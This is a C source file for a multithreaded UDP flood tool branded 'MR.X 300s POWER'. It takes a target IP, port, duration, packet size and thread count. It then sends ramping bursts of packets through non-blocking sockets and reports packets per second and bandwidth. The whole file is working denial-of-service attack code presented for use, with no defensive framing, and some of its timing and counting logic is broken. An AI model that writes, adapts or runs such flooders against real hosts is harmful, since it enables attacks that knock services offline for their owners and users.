#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

volatile unsigned long long total_packets = 0;
volatile unsigned long long total_bytes = 0;
volatile unsigned long long current_pps = 0;
volatile int running = 1;
pthread_t monitor_tid;

void print_k_format(unsigned long long value, char *buffer) {
    if (value < 1000) sprintf(buffer, "%llu", value);
    else if (value < 1000000) sprintf(buffer, "%.1fK", value/1000.0);
    else sprintf(buffer, "%.1fM", value/1000000.0);
}

void* monitor_stats(void* arg) {
    unsigned long long last_packets = 0, last_bytes = 0;
    time_t start = time(NULL);
    
    while (running) {
        sleep(1);
        
        unsigned long long curr_packets = total_packets;
        unsigned long long curr_bytes = total_bytes;
        time_t elapsed = time(NULL) - start;
        
        unsigned long long pps = curr_packets - last_packets;
        unsigned long long bps = (curr_bytes - last_bytes) * 8;
        double mbps = bps / 1000000.0;
        current_pps = pps;
        
        char pps_str[32], total_str[32];
        
        if (pps < 1000) sprintf(pps_str, "%llu", pps);
        else if (pps < 1000000) sprintf(pps_str, "%.1fK", pps/1000.0);
        else sprintf(pps_str, "%.1fM", pps/1000000.0);
        
        if (curr_packets < 1000) sprintf(total_str, "%llu", curr_packets);
        else if (curr_packets < 1000000) sprintf(total_str, "%.1fK", curr_packets/1000.0);
        else sprintf(total_str, "%.1fM", curr_packets/1000000.0);
        
        fprintf(stderr, "MR.X 🔥🔥: %s pkts | %s pps | %.1f Mbps | %lds | X | 0 err\n",
                total_str, pps_str, mbps, elapsed);
        
        last_packets = curr_packets;
        last_bytes = curr_bytes;
    }
    return NULL;
}

void* attack_thread(void* arg) {
    int thread_id = *(int*)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    int broadcast = 1;
    long sndbuf = 1000000000;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(TARGET_PORT);
    target.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    char* packet = malloc(PACKET_SIZE);
    unsigned int seed = time(NULL) + thread_id;
    
    for(int i = 0; i < PACKET_SIZE; i++) {
        packet[i] = (seed * i) % 256;
    }
    
    time_t start = time(NULL);
    unsigned long long local_packets = 0;
    
    time_t phase1_end = start + 0.1;
    while(time(NULL) < phase1_end && running) {
        for(int burst = 0; burst < 5000; burst++) {
            sendto(sock, packet, PACKET_SIZE, MSG_DONTWAIT,
                  (struct sockaddr*)&target, sizeof(target));
            local_packets++;
        }
        
        if (local_packets % 1000 == 0) {
            __sync_fetch_and_add(&total_packets, 1000);
            __sync_fetch_and_add(&total_bytes, PACKET_SIZE * 1000);
            local_packets -= 1000;
        }
    }
    
    time_t phase2_end = start + 0.5;
    while(time(NULL) < phase2_end && running) {
        for(int burst = 0; burst < 500; burst++) {
            sendto(sock, packet, PACKET_SIZE, MSG_DONTWAIT,
                  (struct sockaddr*)&target, sizeof(target));
            local_packets++;
        }
        
        if (local_packets % 1000 == 0) {
            __sync_fetch_and_add(&total_packets, 1000);
            __sync_fetch_and_add(&total_bytes, PACKET_SIZE * 1000);
            local_packets -= 1000;
        }
    }
    
    while (running && (time(NULL) - start) < DURATION_TIME) {
        time_t elapsed = time(NULL) - start;
        int dynamic_burst = 50;
        
        if (elapsed < 60) {
            dynamic_burst = 50;
        } else if (elapsed < 120) {
            dynamic_burst = 60;
        } else if (elapsed < 180) {
            dynamic_burst = 70;
        } else if (elapsed < 240) {
            dynamic_burst = 80;
        } else {
            dynamic_burst = 90;
        }
        
        if (current_pps < 500000) {
            dynamic_burst = dynamic_burst * 120 / 100;
        }
        
        for(int burst = 0; burst < dynamic_burst; burst++) {
            sendto(sock, packet, PACKET_SIZE, MSG_DONTWAIT,
                  (struct sockaddr*)&target, sizeof(target));
            local_packets++;
        }
        
        if (local_packets % 1000 == 0) {
            __sync_fetch_and_add(&total_packets, 1000);
            __sync_fetch_and_add(&total_bytes, PACKET_SIZE * 1000);
            local_packets -= 1000;
        }
    }
    
    if (local_packets > 0) {
        __sync_fetch_and_add(&total_packets, local_packets);
        __sync_fetch_and_add(&total_bytes, PACKET_SIZE * local_packets);
    }
    
    free(packet);
    close(sock);
    return NULL;
}

int validate_ip(const char* ip) {
    struct in_addr addr;
    return inet_pton(AF_INET, ip, &addr) == 1;
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Use: ./mrx_300s [IP] [PORT] [TIME] [SIZE] [THREADS]\n");
        return 1;
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (!validate_ip(TARGET_IP) || TARGET_PORT == 0) {
        fprintf(stderr, "Error: Invalid values\n");
        return 1;
    }
    
    printf("MR.X 300s POWER Started 🔥🔥🔥\n");
    fflush(stdout);
    
    pthread_create(&monitor_tid, NULL, monitor_stats, NULL);
    
    pthread_t* threads = malloc(THREAD_COUNT * sizeof(pthread_t));
    int* thread_ids = malloc(THREAD_COUNT * sizeof(int));
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_ids[i] = i;
        pthread_create(&threads[i], NULL, attack_thread, &thread_ids[i]);
    }
    
    sleep(DURATION_TIME);
    running = 0;
    
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_tid, NULL);
    
    double avg_pps = (double)total_packets / DURATION_TIME;
    double avg_mbps = (total_bytes * 8.0) / (DURATION_TIME * 1000000.0);
    
    char total_str[32], pps_str[32];
    print_k_format(total_packets, total_str);
    print_k_format((unsigned long long)avg_pps, pps_str);
    
    fprintf(stderr, "MR.X 🔥🔥: %s pkts | %s pps | %.1f Mbps | %ds | X | 0 err\n",
            total_str, pps_str, avg_mbps, DURATION_TIME);
    
    printf("MR.X 300s POWER Completed 🔥🔥🔥\n");
    fflush(stdout);
    
    free(threads);
    free(thread_ids);
    
    return 0;
}